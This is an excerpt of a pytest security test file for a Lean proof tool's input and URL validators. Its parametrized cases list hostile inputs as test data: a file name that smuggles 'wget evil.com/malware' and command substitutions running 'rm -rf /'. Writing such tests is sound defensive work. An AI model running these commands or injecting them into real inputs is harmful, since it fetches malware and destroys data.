...
from src.proof_sketcher.security.secure_config import SecureConfig, InputValidator
...
class TestInputValidation:
    ...
    @pytest.mark.parametrize("malicious_input,expected_clean", [
        ...
        ("file.lean || wget evil.com/malware", "file.lean || wget evil.com/malware"),
        ("`rm -rf /`", "`rm -rf /`"),
        ("$(rm -rf /)", "$(rm -rf /)"),
    ...
    @pytest.mark.parametrize("theorem_name,expected_valid", [
        # Valid names
        ("valid_theorem", True),
...
class TestURLValidation:
    ...
    @pytest.mark.parametrize("url,allow_local,expected_valid", [
        # Valid HTTPS URLs
